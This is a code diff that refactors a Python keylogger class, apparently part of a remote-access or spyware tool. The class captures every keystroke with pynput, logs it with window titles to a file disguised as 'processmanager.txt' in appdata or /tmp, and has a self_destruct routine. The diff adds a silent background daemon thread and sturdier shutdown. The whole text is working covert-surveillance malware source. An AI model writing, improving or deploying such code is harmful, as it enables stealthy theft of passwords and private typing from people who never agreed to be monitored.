@@ -8,13 +8,12 @@ class Keylogger:
     def __init__(self):
         import pynput.keyboard
         self._pynput = pynput.keyboard
-        self.logs = ""
         self.current_window = ""
-        self.flag = False
+        self._event = threading.Event()
         self.listener = None
 
         if os.name == 'nt':
-            self.path = os.environ['appdata'] + '\\processmanager.txt'
+            self.path = os.environ.get('appdata', os.path.expanduser('~')) + '\\processmanager.txt'
         else:
             self.path = '/tmp/processmanager.txt'
 
@@ -35,9 +34,9 @@ class Keylogger:
                     ['xprop', '-id', os.environ.get('WINDOWID', '0'), 'WM_NAME'],
                     stderr=subprocess.DEVNULL
                 ).decode(errors='replace').strip()
-                return output.split('"')[1] if '"' in output else "Linux/Mac Window"
+                return output.split('"')[1] if '"' in output else "Linux Window"
             except Exception:
-                return "Linux/Mac Window"
+                return "Linux Window"
 
     def write_file(self, keys):
         with open(self.path, 'a', encoding='utf-8', errors='replace') as writer:
@@ -85,9 +84,12 @@ class Keylogger:
             return f"[-] Error reading logs: {str(e)}"
 
     def self_destruct(self):
-        self.flag = True
+        self._event.set()
         if self.listener:
-            self.listener.stop()
+            try:
+                self.listener.stop()
+            except Exception:
+                pass
             try:
                 self.listener.join()
             except Exception:
@@ -100,6 +102,9 @@ class Keylogger:
     def start(self):
         self.listener = self._pynput.Listener(on_press=self.on_press)
         self.listener.start()
-        while not self.flag:
-            time.sleep(0.5)
-        self.listener = None
+        self._event.wait()
+
+    def start_async(self):
+        t = threading.Thread(target=self.start, daemon=True)
+        t.start()
+        return t
